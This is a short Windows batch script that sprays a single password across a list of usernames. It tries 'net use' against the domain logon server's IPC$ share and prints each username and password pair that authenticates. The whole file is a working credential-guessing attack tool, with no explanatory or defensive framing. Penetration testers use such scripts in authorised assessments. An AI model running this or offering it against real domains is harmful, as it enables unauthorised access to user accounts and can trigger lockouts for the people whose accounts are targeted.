@echo off
@set password=%1
@set userList=%2
@FOR /F "delims=" %%n in (%userList%) DO @(@net use %logonserver%\IPC$ /user:%userdomain%\%%n %password% 1>NUL 2>&1 && @echo [*] %%n:%password% && net use /delete %logonserver%\IPC$ > NUL)
